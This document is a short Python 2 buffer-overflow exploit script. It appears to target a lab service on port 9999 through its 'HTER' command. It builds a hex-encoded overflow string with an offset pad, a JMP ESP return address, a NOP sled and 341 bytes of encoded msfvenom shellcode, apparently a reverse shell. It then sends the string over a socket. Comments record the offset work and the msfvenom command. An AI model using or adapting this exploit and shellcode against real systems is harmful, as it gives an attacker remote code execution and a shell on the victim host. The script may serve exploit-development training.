#!/usr/bin/env python2
import os, sys, time
from socket import socket, AF_INET,SOCK_STREAM

host = ("192.168.56.8",9999)

sploit="HTER "
# sploit += "A" * 2048 # crash EIP=0aAAAAAA
# 2100 crash EIP=AAAAAAAA, o/f 16 bytes
# sploit += "A" * 2100
# sploit += sys.argv[1]  #  NO!
# 	can't just $(`locate pattern_create.rb` 2100), because it appears
#	that only 0-9a-fA-F is being accepted here!
#	The crash was unusable/unresolvable, disappeared registers, etc, when 
#   trying this method of offset determination.
#.  2048 had a crash with first three bytes overwritten.
#.  2049 fully overwrites.   Therefore, EIP located after 2041 characters.
#.  23 bytes after return address, so 46 characters.
#.  Also seem to be misaligned by one character.
#.  Max space seems to be "HTER " + "A" + 2046*2 characters wide.
sploit += "A" * 1
sploit += "90" * (1020) # 2040 chars
# 625011AF   FFE4	JMP ESP
sploit += "af115062" # jmp esp
# msfvenom8.56.181 LPORT+443 EXITFUNC=process -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 1 -f c |grep '"' |sed -re 's/\\x//g' -e 's/;//g'
sploit+="90"*8
sploit += (
"be371d793adac8d97424f45b2bc9b1"
"4f83c304317310037310d5e885d290"
"137623c29a9312d0f9d007e48ab5ab"
"8fdf2d3ffdf742884b2e6c097aee22"
"c91d92381efdabf253fcecef9caca5"
"640e40c13993610536ab1920895893"
"2bdaf1a864c27af654f3afe5a9bac4"
"dd5a3d0d2ca20f71e29dbf7cfbda78"
"9f8e107b2288e201f81df7a28b85d3"
"535f5397581410ff7cabf58b7920f8"
"5b0872de7f50207fd93c8780399878"
"24310b6c5e1844416ca394cde7d0a6"
"52537f8b1b7d78ec31391613ba393e"
"d0ee6928f18ee2a8fe5aa4f8503504"
"a910e5eca39eda0ccc746d0b5bb7c6"
"ab295f15cb501b902d384bf5e6d5f2"
"5c7c47fa4a14e46911e463928eb324"
"64c751d9df714720b9bac3ff7a44ca"
"72c662dc4ac72e88029ef866e5484b"
"d0bf2705b4460496c24641602af63c"
"355537a9b12e25493de5ed7974a744"
"12d132d57fe2e91a86611be37d796e"
"e63a3d839a53a8a30953f9"
) # 341 bytes
sploit+="90"*(2044-1020 - 8-341)
sploit += ":\\"


cx = socket(AF_INET,SOCK_STREAM)
cx.connect(host)
cx.send(sploit)
cx.close()
